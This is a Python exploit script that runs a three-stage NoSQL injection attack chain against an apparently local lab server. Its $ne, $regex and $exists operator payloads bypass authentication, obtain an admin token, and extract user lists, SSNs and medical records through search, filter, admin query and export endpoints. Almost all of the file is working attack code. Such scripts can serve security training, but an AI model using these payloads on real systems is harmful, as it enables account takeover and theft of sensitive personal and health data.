#!/usr/bin/env python3
# nosql injection exploit script
# three stages: discovery, bypass, extraction

import requests
import json
import sys

BASE_URL = 'http://127.0.0.1:4000'

def print_stage(stage_num, title):
    print(f"STAGE {stage_num}: {title}")

def stage1_injection_discovery():
    print_stage(1, "INJECTION DISCOVERY")
    
    # test operator injection
    print("\n[VULN TYPE: Authentication Bypass - Operator Injection]")
    
    payload = {"username": "admin", "password": {"$ne": None}}
    print(f"INPUT: POST /auth/login")
    print(f"PAYLOAD: {json.dumps(payload)}")
    try:
        r = requests.post(f"{BASE_URL}/auth/login", json=payload, timeout=5)
        print(f"OUTPUT: Status {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            print(f"RESULT: Authentication bypassed - Token obtained")
            print(f"        User: {data.get('user', {}).get('username')} ({data.get('user', {}).get('role')})")
        else:
            print(f"RESULT: Failed - {r.text}")
    except Exception as e:
        print(f"RESULT: Error - {e}")
    
    # test regex injection
    print("\n[VULN TYPE: Authentication Bypass - Regex Injection]")
    
    payload2 = {"username": {"$regex": ".*"}, "password": {"$ne": None}}
    print(f"INPUT: POST /auth/login")
    print(f"PAYLOAD: {json.dumps(payload2)}")
    try:
        r = requests.post(f"{BASE_URL}/auth/login", json=payload2, timeout=5)
        print(f"OUTPUT: Status {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            print(f"RESULT: First user matched - {data.get('user', {}).get('username')}")
        else:
            print(f"RESULT: Failed")
    except Exception as e:
        print(f"RESULT: Error - {e}")
    
    # test search injection
    print("\n[VULN TYPE: Data Extraction - Search Injection]")
    
    query = json.dumps({"$regex": ".*"})
    print(f"INPUT: GET /search")
    print(f"PAYLOAD: q={query}")
    try:
        r = requests.get(f"{BASE_URL}/search", params={"q": query}, timeout=5)
        print(f"OUTPUT: Status {r.status_code}")
        if r.status_code == 200:
            results = r.json()
            print(f"RESULT: Extracted {len(results)} users")
            for user in results:
                print(f"        - {user.get('username')} ({user.get('role')})")
        else:
            print(f"RESULT: Failed")
    except Exception as e:
        print(f"RESULT: Error - {e}")
    
    # test role extraction
    print("\n[VULN TYPE: Privileged Data Extraction - Role-based Query]")
    
    query2 = json.dumps({"role": "admin"})
    print(f"INPUT: GET /search")
    print(f"PAYLOAD: q={query2}")
    try:
        r = requests.get(f"{BASE_URL}/search", params={"q": query2}, timeout=5)
        print(f"OUTPUT: Status {r.status_code}")
        if r.status_code == 200:
            results = r.json()
            print(f"RESULT: Found {len(results)} admin users")
            for user in results:
                print(f"        Username: {user.get('username')}")
                print(f"        Full Name: {user.get('fullName')}")
                print(f"        SSN: {user.get('ssn')}")
        else:
            print(f"RESULT: Failed")
    except Exception as e:
        print(f"RESULT: Error - {e}")

def stage2_authentication_bypass():
    print_stage(2, "AUTHENTICATION BYPASS")
    
    # bypass password check
    print("\n[VULN TYPE: Authentication Bypass - Password Bypass]")
    
    payload = {"username": "admin", "password": {"$ne": None}}
    print(f"INPUT: POST /auth/login")
    print(f"PAYLOAD: {json.dumps(payload)}")
    try:
        r = requests.post(f"{BASE_URL}/auth/login", json=payload, timeout=5)
        print(f"OUTPUT: Status {r.status_code}")
        
        if r.status_code == 200:
            data = r.json()
            token = data.get('token')
            user = data.get('user', {})
            
            print(f"RESULT: Authentication bypassed")
            print(f"        Role: {user.get('role')}")
            print(f"        Token: {token[:50]}...")
            
            # test admin endpoint
            print(f"\nINPUT: POST /admin/export")
            print(f"HEADERS: Authorization: Bearer {token[:20]}...")
            headers = {"Authorization": f"Bearer {token}"}
            r2 = requests.post(f"{BASE_URL}/admin/export", headers=headers, timeout=5)
            print(f"OUTPUT: Status {r2.status_code}")
            
            if r2.status_code == 200:
                export_data = r2.json()
                users_count = len(export_data.get('users', []))
                records_count = len(export_data.get('records', []))
                print(f"RESULT: Protected endpoint accessed")
                print(f"        Retrieved {users_count} users, {records_count} records")
                return token
            else:
                print(f"RESULT: Access denied (Status {r2.status_code})")
        else:
            print(f"RESULT: Authentication failed")
            return None
    except Exception as e:
        print(f"RESULT: Error - {e}")
        return None
    
    return None

def stage3_data_extraction(token=None):
    print_stage(3, "DATA EXTRACTION")
    
    # extract all users
    print("\n[VULN TYPE: User Enumeration - Full Extraction]")
    
    query = json.dumps({"$regex": ".*"})
    print(f"INPUT: GET /search")
    print(f"PAYLOAD: q={query}")
    try:
        r = requests.get(f"{BASE_URL}/search", params={"q": query}, timeout=5)
        print(f"OUTPUT: Status {r.status_code}")
        if r.status_code == 200:
            users = r.json()
            print(f"RESULT: Extracted {len(users)} users with full details")
            for user in users:
                print(f"        {user.get('username')} - {user.get('fullName')} - SSN: {user.get('ssn')}")
        else:
            print(f"RESULT: Failed")
    except Exception as e:
        print(f"RESULT: Error - {e}")
    
    # extract ssn data
    print("\n[VULN TYPE: Sensitive Data Extraction - SSN Enumeration]")
    
    filter_payload = {"ssn": {"$exists": True, "$ne": None}}
    print(f"INPUT: POST /users/filter")
    print(f"PAYLOAD: {json.dumps(filter_payload)}")
    try:
        r = requests.post(f"{BASE_URL}/users/filter", json=filter_payload, timeout=5)
        print(f"OUTPUT: Status {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            users_with_ssn = data.get('users', [])
            print(f"RESULT: Found {len(users_with_ssn)} users with SSN")
            for user in users_with_ssn:
                print(f"        {user.get('username')}: {user.get('ssn')}")
        else:
            print(f"RESULT: Failed")
    except Exception as e:
        print(f"RESULT: Error - {e}")
    
    # extract medical records
    print("\n[VULN TYPE: Medical Records Extraction]")
    
    records_payload = {"patientId": {"$regex": ".*"}}
    print(f"INPUT: POST /records/search")
    print(f"PAYLOAD: {json.dumps(records_payload)}")
    try:
        r = requests.post(f"{BASE_URL}/records/search", json=records_payload, timeout=5)
        print(f"OUTPUT: Status {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            records = data.get('records', [])
            print(f"RESULT: Extracted {len(records)} medical records")
            for record in records:
                print(f"        Patient: {record.get('patientId')} - {record.get('diagnosis')}")
        else:
            print(f"RESULT: Failed")
    except Exception as e:
        print(f"RESULT: Error - {e}")
    
    # admin query if token exists
    if token:
        print("\n[VULN TYPE: Admin Query Injection - Advanced Extraction]")
        
        query_payload = json.dumps({"ssn": {"$regex": ".*"}})
        payload = {"query": query_payload}
        print(f"INPUT: POST /admin/query")
        print(f"PAYLOAD: {json.dumps(payload)}")
        headers = {"Authorization": f"Bearer {token}"}
        
        try:
            r = requests.post(f"{BASE_URL}/admin/query", headers=headers, json=payload, timeout=5)
            print(f"OUTPUT: Status {r.status_code}")
            if r.status_code == 200:
                results = r.json()
                print(f"RESULT: Extracted {len(results)} users via admin query")
                for user in results:
                    print(f"        {user.get('username')} - SSN: {user.get('ssn')}")
            else:
                print(f"RESULT: Failed")
        except Exception as e:
            print(f"RESULT: Error - {e}")
        
        # export all data
        print("\n[VULN TYPE: Complete Data Exfiltration - Admin Export]")
        
        print(f"INPUT: POST /admin/export")
        print(f"HEADERS: Authorization: Bearer {token[:20]}...")
        try:
            r = requests.post(f"{BASE_URL}/admin/export", headers=headers, timeout=5)
            print(f"OUTPUT: Status {r.status_code}")
            if r.status_code == 200:
                data = r.json()
                users = data.get('users', [])
                records = data.get('records', [])
                print(f"RESULT: Complete data exfiltration successful")
                print(f"        Users: {len(users)}, Medical Records: {len(records)}")
            else:
                print(f"RESULT: Failed")
        except Exception as e:
            print(f"RESULT: Error - {e}")

def main():
    print("\n" + "="*60)
    print("NoSQL Injection Exploit - Full Attack Chain")
    print("="*60)
    print(f"Target: {BASE_URL}")
    
    # check server status
    try:
        r = requests.get(f"{BASE_URL}/health", timeout=5)
        if r.status_code != 200:
            print(f"\n[!] Warning: Server health check failed (Status: {r.status_code})")
    except requests.exceptions.ConnectionError:
        print(f"\n[!] ERROR: Cannot connect to {BASE_URL}")
        print("[!] Make sure the server is running: npm start")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error checking server: {e}")
    
    # run all stages
    stage1_injection_discovery()
    token = stage2_authentication_bypass()
    stage3_data_extraction(token)
    
    print("\nSummary:")
    print("  Stage 1: Injection points discovered")
    print("  Stage 2: Authentication bypassed" + (" (admin access)" if token else " (limited access)"))
    print("  Stage 3: Sensitive data extracted")
    print("\n")

if __name__ == '__main__':
    main()
